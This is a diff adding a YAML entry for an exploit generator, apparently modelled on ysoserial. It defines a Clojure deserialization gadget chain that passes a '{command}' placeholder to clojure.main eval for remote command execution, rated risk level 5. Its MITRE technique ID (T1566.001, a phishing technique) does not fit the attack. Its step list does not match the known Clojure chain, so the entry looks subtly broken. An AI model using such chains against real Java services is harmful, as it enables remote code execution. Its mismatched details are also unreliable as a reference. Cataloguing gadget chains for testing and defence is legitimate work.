@@ -1,0 +1,24 @@
+name: "Clojure"
+category: "clojure"
+description: "Clojure gadget chain using eval and require"
+jdk_version: "all"
+dependencies:
+  - name: "clojure"
+    version: "1.8.0"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "clojure.lang.PersistentArrayMap"
+    method_name: "readObject"
+    parameters: []
+  - class_name: "clojure.main"
+    method_name: "eval"
+    parameters:
+      - "{command}"
+  - class_name: "clojure.lang.RT"
+    method_name: "load"
+    parameters: []
